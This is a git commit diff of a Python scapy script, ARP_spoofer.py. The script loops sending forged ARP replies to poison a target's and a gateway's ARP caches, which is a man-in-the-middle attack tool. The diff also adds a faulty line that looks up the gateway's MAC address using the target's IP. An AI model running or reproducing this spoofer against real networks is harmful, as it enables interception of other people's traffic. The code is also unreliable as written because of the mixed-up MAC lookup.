9419d1ffa13fc88a238ecedff44335e373456272
SillyFinny <51672647+SillyFinny@users.noreply.github.com>
2019-07-03 07:16:04 -0400

    Add files via upload

--- ARP_spoofer.py
+++ ARP_spoofer.py
@@ -7,12 +7,11 @@ def get_mac(ip):
 	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 	arp_request_broadcast = broadcast/arp_request
 	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
 	return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
-	target_mac = get_mac(target_ip)
-	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+def spoof(target_ip, target_mac, spoof_ip):
+	arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	scapy.send(arp_response, verbose=False)
 
 def restore(destination_ip, source_ip):
 	destination_mac = get_mac(destination_ip)
@@ -20,15 +19,17 @@ def restore(destination_ip, source_ip):
 	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
 	scapy.send(packet, count=4, verbose=False)
 
-target_ip = "10.0.2.4"
+target_ip = "10.0.2.5"
 gateway_ip = "10.0.2.1"
 
 try:
+	target_mac = get_mac(target_ip)
+	gateway_mac = get_mac(target_ip)
 	packet_sent_count = 0
 	
 	while True:
-		spoof(target_ip, gateway_ip)
-		spoof(gateway_ip, target_ip)
+		spoof(target_ip, target_mac, gateway_ip)
+		spoof(gateway_ip, gateway_mac, target_ip)
 		packet_sent_count = packet_sent_count + 2
 		print("\r-- Sent packets: " + str(packet_sent_count), end="")
 		time.sleep(2)
